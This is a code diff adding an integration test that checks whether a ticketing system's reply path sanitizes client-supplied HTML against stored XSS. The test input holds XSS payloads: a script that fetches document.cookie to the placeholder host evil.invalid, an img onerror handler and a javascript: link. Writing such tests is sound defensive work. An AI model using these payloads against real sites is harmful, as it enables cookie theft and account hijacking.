@@ -319,6 +319,47 @@ describe('IT-REPLY/ACK: reply threading + auto-ack', () => {
     expect(gun?.status).toBe('active');
   });
 
+  it('IT-REPLY-004: client-supplied bodyHtml is sanitized before it reaches body_html_safe (stored XSS)', async () => {
+    if (!ready) return;
+    const t = await ingest({
+      from: 'xss@x.com',
+      to: HRIS_BOX,
+      subject: 'Payslip',
+      text: 'question',
+      messageId: '<rep-4-orig@x.com>',
+    });
+    await harness!.db.update(tickets).set({ assigneeId: agent.id }).where(eq(tickets.id, t.id));
+
+    // bodyHtml comes straight off the wire (compose.controller replySchema). It is
+    // stored into body_html_safe, which the FE renders with dangerouslySetInnerHTML —
+    // so the reply path must sanitize it, exactly as intake does for inbound mail.
+    const sent = await reply.reply(agent, t.id, {
+      to: ['xss@x.com'],
+      body: 'answer',
+      bodyHtml:
+        '<p>answer</p><script>fetch("//evil.invalid?c="+document.cookie)</script>' +
+        '<img src=x onerror="alert(1)"><a href="javascript:alert(2)">click</a>',
+    });
+    expect('messageId' in sent).toBe(true);
+
+    // Pin to OUR reply by Message-ID — the auto-ack is outbound on this ticket too.
+    const [msg] = await withActor(systemActor, (tx) =>
+      tx
+        .select({ safe: ticketMessages.bodyHtmlSafe })
+        .from(ticketMessages)
+        .where(eq(ticketMessages.messageId, (sent as { messageId: string }).messageId)),
+    );
+    const safe = msg!.safe ?? '';
+    expect(safe).not.toContain('<script');
+    expect(safe).not.toContain('onerror');
+    expect(safe).not.toContain('javascript:');
+    // ...while the legitimate content survives — sanitizing must not eat the reply.
+    expect(safe).toContain('answer');
+    // Our own footer is still intact (it is appended AFTER the sanitized user HTML,
+    // so its margin-top/border-left styling is never passed through allowedStyles).
+    expect(safe).toContain('Ticket:');
+  });
+
   it('IT-REPLY-003: outbound message + outbox row are atomic — fail mid-tx rolls back both', async () => {
     if (!ready) return;
     const t = await ingest({
